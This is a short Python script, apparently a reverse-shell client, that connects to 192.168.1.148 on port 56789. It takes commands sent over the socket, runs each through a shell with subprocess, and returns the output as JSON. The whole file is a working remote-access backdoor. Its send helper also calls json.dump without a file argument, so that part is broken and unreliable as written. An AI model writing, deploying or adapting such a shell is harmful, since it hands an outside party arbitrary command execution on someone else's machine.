
#!/usr/bin/python

import socket
import subprocess
import json

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.148", 56789))


# helper send and receive functions:
def json_recv():
	data = ""
	while True:
		try:
			data = data + s.recv(1024)
			return json.loads(data)
		except ValueError:
			continue

def json_send(data):
	json_data = json.dump(data)
	s.send(json_data)



def shell():
	while True:
		server_cmd = json_recv()
		if server_cmd == 'q':
			break
		else:
			# if everything goes a expected, this else condition will run
			ps = subprocess.Popen(
				server_cmd,
				shell=True,
				stdout=subprocess.PIPE,
				stdin=subprocess.PIPE,
				stderr=subprocess.PIPE
				)
			result = ps.stdout.read() + ps.stderr.read()
			json_send(result)


shell()
s.close()



